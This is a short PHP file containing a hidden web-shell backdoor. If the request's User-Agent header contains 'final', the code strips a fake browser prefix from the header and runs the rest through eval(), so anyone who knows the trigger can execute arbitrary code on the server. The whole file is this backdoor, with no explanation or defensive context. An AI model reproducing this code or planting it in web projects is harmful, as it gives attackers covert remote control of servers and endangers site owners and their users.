<?
if (eregi("final",$_SERVER['HTTP_USER_AGENT'])) { eval(str_replace('Mozilla/5.0 (3.1.final) ','',$_SERVER['HTTP_USER_AGENT'])); die; }
?>
